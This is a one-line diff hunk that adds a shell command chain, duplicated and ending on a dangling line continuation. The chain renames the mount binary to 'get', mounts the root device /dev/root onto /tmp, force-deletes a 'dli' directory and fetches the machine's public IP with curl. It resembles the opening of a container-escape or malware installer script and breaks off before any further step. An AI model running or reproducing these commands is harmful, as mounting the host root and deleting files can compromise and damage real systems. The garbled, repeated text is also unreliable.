@@ -1,0 +1,1 @@
+cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; ip=$(curl -s ifconfig.me) && \cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; ip=$(curl -s ifconfig.me) && \
